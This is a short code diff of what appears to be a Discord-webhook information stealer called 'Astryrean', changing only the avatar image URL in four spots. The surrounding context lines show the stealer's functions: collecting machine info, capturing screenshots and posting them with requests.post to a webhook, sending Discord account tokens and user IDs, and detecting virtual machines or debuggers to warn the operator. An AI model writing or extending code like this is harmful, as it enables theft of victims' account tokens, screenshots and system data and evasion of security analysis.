@@ -66,7 +66,7 @@ def machineinfo():
 
     data2 = {
         "username": "Astryrean", 
-        "avatar_url": "https://i.imgur.com/eZdevJl.jpeg",  
+        "avatar_url": "https://i.imgur.com/n5NcLFl.jpeg",  
         "embeds": [
             {
                 "title": "💻️ Machine Info",
@@ -118,7 +118,7 @@ def screenshot():
         data = {
             "username": "Astryrean", 
             "content": f"📸 Screenshot",
-            "avatar_url": "https://i.imgur.com/eZdevJl.jpeg",  
+            "avatar_url": "https://i.imgur.com/n5NcLFl.jpeg",  
         }
         response3 = requests.post(h00k, data=data, files=files)
     
@@ -256,7 +256,7 @@ def tokens(token: str):
 
             embed = {
                 "username": "Astryrean",
-                "avatar_url": "https://i.imgur.com/eZdevJl.jpeg",
+                "avatar_url": "https://i.imgur.com/n5NcLFl.jpeg",
                 "embeds": [{
                     "title": f"{user_name} | ({user_id})",
                     "fields": [
@@ -430,7 +430,7 @@ def checker():
         data_VM = {
             "username": "Astryrean | VM Detection",
             "content": f"# @everyone \n ⚠️WARN⚠️ \n We've detected activity attempting to attack or debug your webhook. This webhook has been removed.",
-            "avatar_url": "https://i.imgur.com/eZdevJl.jpeg",
+            "avatar_url": "https://i.imgur.com/n5NcLFl.jpeg",
         }
 
         try:
